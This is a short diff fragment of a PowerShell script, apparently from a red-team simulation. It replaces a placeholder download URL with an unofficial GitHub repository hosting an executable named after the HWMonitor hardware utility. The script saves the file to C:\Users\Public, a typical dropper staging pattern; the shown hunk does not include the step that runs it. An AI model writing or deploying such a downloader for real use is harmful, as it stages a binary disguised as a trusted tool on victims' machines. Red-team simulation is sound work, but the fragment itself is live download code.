@@ -2,7 +2,7 @@
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$BinaryUrl = "https://raw.githubusercontent.com/your-org/red-team-sim/main/HWMonitor_x64.exe"
+$BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
 $DestinationDir = "C:\Users\Public"
 $DestinationPath = Join-Path $DestinationDir "HWMonitor_x64.exe"
 
